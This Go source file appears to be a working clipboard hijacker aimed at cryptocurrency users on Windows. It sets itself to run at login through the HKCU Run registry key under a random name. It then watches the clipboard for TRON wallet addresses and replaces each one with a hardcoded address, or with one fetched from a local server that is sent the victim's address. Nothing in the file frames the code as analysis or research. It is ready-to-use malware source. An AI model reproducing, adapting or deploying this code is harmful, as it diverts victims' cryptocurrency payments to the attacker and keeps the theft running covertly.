package main

import (
	"context"
	"encoding/json"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/fbsobreira/gotron-sdk/pkg/address"
	"golang.org/x/sys/windows/registry"
)

var (
	DefaultAddress = "TWEpWqvuxVqcZJzKw14dTH3yLheFKHzhzJ"
	Enable         = false
)

func RandName() string {
	chars := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	rand.Seed(time.Now().UnixNano())
	length := rand.Intn(5) + 6
	name := make([]rune, length)
	for i := range name {
		name[i] = chars[rand.Intn(len(chars))]
	}
	return string(name)
}

func GetSelfPath() string {
	exe, _ := os.Executable()
	path, _ := filepath.Abs(exe)
	return path
}

func SetStartup(name string) error {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue(name, GetSelfPath())
}

func StartupExists(name string) bool {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE,
	)
	if err != nil {
		return false
	}
	defer key.Close()

	_, _, err = key.GetStringValue(name)
	return err == nil
}

type ResponseAddress struct {
	Address string `json:"address"`
}

func main() {
	appName := RandName()
	// appName := "aaahhh"

	if !StartupExists(appName) {
		_ = SetStartup(appName)
	}

	processed := make(map[string]bool)

	for {
		content, err := clipboard.ReadAll()
		if err == nil && strings.HasPrefix(content, "T") {
			if addr := matchTron(content); addr != "" && !processed[addr] {
				if Enable {
					clipboard.WriteAll(DefaultAddress)
				} else {
					clipboard.WriteAll(GetAddress(addr))
					processed[addr] = true
				}
			}
		}
		time.Sleep(600 * time.Millisecond)
	}
}

func matchTron(s string) string {
	regex := regexp.MustCompile(`^(T[1-9A-HJ-NP-Za-km-z]{33})$`)
	m := regex.FindStringSubmatch(s)
	if len(m) > 1 && IsTronAddress(m[1]) {
		return m[1]
	}
	return ""
}

func IsTronAddress(a string) bool {
	_, err := address.Base58ToAddress(a)
	return err == nil
}

func GetAddress(addr string) string {
	req, _ := http.NewRequest(http.MethodGet, "http://localhost:7777/v1/getadress?address="+addr, nil)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	req = req.WithContext(ctx)
	defer cancel()

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return DefaultAddress
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var res ResponseAddress
	_ = json.Unmarshal(body, &res)
	if res.Address == "" {
		return DefaultAddress
	}
	return res.Address
}
